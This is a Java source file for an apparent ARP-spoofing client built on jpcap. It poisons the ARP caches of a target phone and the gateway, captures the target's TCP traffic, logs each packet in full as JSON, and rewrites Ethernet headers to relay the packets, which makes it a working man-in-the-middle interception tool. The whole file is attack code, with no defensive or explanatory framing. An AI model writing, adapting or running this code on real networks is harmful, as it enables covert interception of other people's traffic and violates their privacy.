package com.vigos.flink.arp;

import com.alibaba.fastjson.JSON;
import com.vigos.flink.arp.util.NetWorkUtil;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.PacketReceiver;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.InetAddress;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

/**
 * Created by duke on 2016/11/15.
 * arp-client
 */
public class NetWorkIntercept implements PacketReceiver {
    private static Logger logger = LoggerFactory.getLogger(NetWorkIntercept.class);
    private JpcapSender sender;
    private InetAddress destIp;
    private byte[] destMac;
    private InetAddress gateIp;
    private byte[] gateMac;
    private NetworkInterface device;
    private InetAddress deviceIp;
    private Executor executor = Executors.newFixedThreadPool(10);
    private Executor deviceExecutor = Executors.newFixedThreadPool(10);

    public NetWorkIntercept(JpcapSender sender, InetAddress destIp, byte[] destMac, InetAddress gateIp, byte[] gateMac, NetworkInterface device) {
        this.sender = sender;
        this.destIp = destIp;
        this.destMac = destMac;
        this.gateIp = gateIp;
        this.gateMac = gateMac;
        this.device = device;
        this.deviceIp = device.addresses[1].address;
    }

    /*
       拦截网卡数据包
     */
    public static void main(String[] args) throws Exception {
        //获取同网段网卡
        NetworkInterface device = NetWorkUtil.getDevice(Constants.NET_WORK);
        //打开网卡
        JpcapCaptor captor = JpcapCaptor.openDevice(device, 65535, false, 10000);
        //调用Arp欺诈函数
        byte[] destMac = NetWorkUtil.stomac(Constants.DE_MAC);
        byte[] gateMac = NetWorkUtil.stomac(Constants.GATE_MAC);
        Arp arp = new Arp(captor.getJpcapSenderInstance(), device);
        InetAddress destIp = InetAddress.getByName(Constants.DE_IP);
        InetAddress gateIp = InetAddress.getByName(Constants.GATE_IP);
        arp.sendArp(destIp, destMac, gateIp, gateMac, Constants.TIME);
        captor.setFilter("tcp and host 192.168.123.210", true);
        captor.loopPacket(-1, new NetWorkIntercept(captor.getJpcapSenderInstance(), destIp, destMac, gateIp, gateMac, device));
    }

    @Override
    public void receivePacket(Packet packet) {
        if (packet != null) {
            TCPPacket p = (TCPPacket) packet;
            EthernetPacket dl = (EthernetPacket) p.datalink;
            logger.info("数据包:{}->{}，{}", NetWorkUtil.stomac(dl.src_mac), NetWorkUtil.stomac(dl.dst_mac), NetWorkUtil.stomac(destMac));
            if (p.src_ip.getHostAddress().equals(destIp.getHostAddress()) && NetWorkUtil.stomac(dl.src_mac).equals(NetWorkUtil.stomac(destMac))) {
                logger.info("手机端数据包:{}->{}\n{}", NetWorkUtil.stomac(dl.src_mac), NetWorkUtil.stomac(dl.dst_mac), JSON.toJSONString(p));
                send(packet, gateMac);
            } else if (p.src_ip.getHostAddress().equals(deviceIp.getHostAddress()) || p.dst_ip.getHostAddress().equals(deviceIp.getHostAddress())) {
                logger.info("设备数据包:{}", JSON.toJSONString(p));
                deviceExecutor.execute(() -> sender.sendPacket(packet));
            } else if (NetWorkUtil.stomac(dl.src_mac).equals(NetWorkUtil.stomac(gateMac))) {
                logger.info("网关数据包:{}->{}\n{}", NetWorkUtil.stomac(dl.src_mac), NetWorkUtil.stomac(dl.dst_mac), JSON.toJSONString(p));
                send(packet, destMac);
            }
        }
    }

    private void send(Packet packet, byte[] changeMAC) {
        if (packet.datalink instanceof EthernetPacket) {
                EthernetPacket eth = (EthernetPacket) packet.datalink;
                for (int i = 0; i < 6; i++) {
                    eth.dst_mac[i] = changeMAC[i]; //修改包以太头，改变包的目标
                    eth.src_mac[i] = device.mac_address[i]; //源发送者为A
                }
                sender.sendPacket(packet);
        }
    }
}
